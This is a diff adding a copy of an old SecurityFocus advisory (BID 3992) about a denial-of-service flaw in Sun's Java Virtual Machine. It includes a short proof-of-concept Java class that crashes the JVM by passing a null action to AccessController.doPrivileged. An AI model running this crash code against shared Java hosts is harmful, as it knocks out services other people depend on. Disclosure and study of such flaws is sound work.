@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/3992/info
+
+Java programs run in an intepreted environment, the Java Virtual Machine (JVM). Sun has provided a reference JVM implementation for multiple platforms, including Solaris, Windows and Linux.
+
+It is possible for a maliciously constructed, valid java program to crash the Sun JVM. This may result in a denial of service attack in a shared environment. The ability to consistantly exploit this vulnerability has been demonstrated on the Linux version of the Sun JVM.
+
+public class CrashMe
+{
+    public static void main(String[] args)
+    {
+        java.security.AccessController.doPrivileged
+        ((java.security.PrivilegedAction)null);
+    }
+}
